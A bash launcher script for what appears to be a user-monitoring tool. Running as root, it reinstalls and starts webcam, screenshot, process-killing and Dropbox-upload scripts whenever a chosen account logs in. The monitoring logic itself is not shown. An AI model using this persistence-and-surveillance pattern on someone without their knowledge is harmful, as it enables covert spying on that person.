#!/bin/bash
. watcher

INSTALL=0
WATCHER_RUN=0


function check_acc {
	echo "Check account $1"
	if [[ -d "$INSTALL_DIR" ]] && [[ -d "$INSTALL_DIR/camera" ]] && [[ -d "$INSTALL_DIR/report" ]] && [[ -d "$INSTALL_DIR/screenshot" ]] && [[ -d "$INSTALL_DIR/tmp" ]] && [[ -d "$INSTALL_DIR/tosend" ]] && [[ -d "$INSTALL_DIR/tosendlater" ]]
	then
		sleep 0
	else
		INSTALL=1
	fi

	if [[ -f "$INSTALL_DIR/watcher.sh" ]] && [[ -f "$INSTALL_DIR/camera.sh" ]] && [[ -f "$INSTALL_DIR/a_up_dropbox.sh" ]] && [[ -f "$INSTALL_DIR/inf.sh" ]] && [[ -f "$INSTALL_DIR/kill_soft2.sh" ]] && [[ -f "$INSTALL_DIR/screenshot.sh" ]] && [[ -f "$INSTALL_DIR/send_later.sh" ]] && [[ -f "$INSTALL_DIR/send_later_command.sh" ]] && [[ -f "$INSTALL_DIR/stop.sh" ]] && [[ -f "$INSTALL_DIR/function.sh" ]]
	then
		sleep 0
	else
		INSTALL=1
	fi
}

function copy_file {
	# $1 - full file path
	# $2 - file name
	# $3 - 1 if executable, 0 if not
	# $4 - add "cd" command at the top
	touch "$1/$2"
	echo "#!/bin/bash">>"$1/$2"
	if [ $4 -eq "1" ]
	then
		echo "cd $1">>"$1/$2"
	fi
	echo "COMP_ID=\"$COMP_ID\"">>"$1/$2"

	cat "$SRC_PATH/$2">>"$1/$2"
	if [ $3 -eq "1" ]
	then
		chmod +x "$1/$2"
	fi
}

function install_watcher {
	echo "Install watcher"
	rm -r "$INSTALL_DIR"
	mkdir "$INSTALL_DIR"
	mkdir "$INSTALL_DIR/camera"
	mkdir "$INSTALL_DIR/report"
	mkdir "$INSTALL_DIR/screenshot"
	mkdir "$INSTALL_DIR/tmp"
	mkdir "$INSTALL_DIR/tosend"
	mkdir "$INSTALL_DIR/tosendlater"
	copy_file "$INSTALL_DIR" "watcher.sh" 1 1
	copy_file "$INSTALL_DIR" "camera.sh" 1 1
	copy_file "$INSTALL_DIR" "inf.sh" 1 1
	copy_file "$INSTALL_DIR" "kill_soft2.sh" 1 1
	copy_file "$INSTALL_DIR" "a_up_dropbox.sh" 1 1
	copy_file "$INSTALL_DIR" "screenshot.sh" 1 1
	copy_file "$INSTALL_DIR" "send_later.sh" 1 1
	copy_file "$INSTALL_DIR" "send_later_command.sh" 1 1
	copy_file "$INSTALL_DIR" "stop.sh" 1 1
	copy_file "$INSTALL_DIR" "function.sh" 0 0
}

function check_if_user_logged {
	who|grep $ACCN > /dev/null
	if [ $? -eq 0 ]
	then
		echo "User $ACCN is logged in "
		if [ $WATCHER_RUN -eq 0 ]
		then
			check_acc $ACCN
			if [ $INSTALL -eq "1" ]
			then
				install_watcher "$ACCN" "$ACCG"
				chown -R $ACCN:$ACCG "$INSTALL_DIR"
			fi
			sudo -u $ACCN $INSTALL_DIR/watcher.sh &
			WATCHER_PID=$!
			WATCHER_RUN=1
			sleep 10
			INSTALL=0
		fi
	else
		echo "User $ACCN is not logged in "
		if [ $WATCHER_RUN -eq 1 ]
		then
			cd $INSTALL_DIR
			sudo -u $ACCN ./stop.sh
			# for Fedora 16 users use folowing command instead of sudo
			# runuser $ACCN -c $ACCN ./stop.sh
			unset WATCHER_PID
			WATCHER_RUN=0
		fi
	fi
}

sleep 1

function control_c {
	echo -en "\n EXITING \n"
	sudo -u $ACCN ./stop.sh
	unset WATCHER_PID
	WATCHER_RUN=0
	exit $?
}
 
trap control_c SIGINT

while true
do
	check_if_user_logged
	sleep 300
done
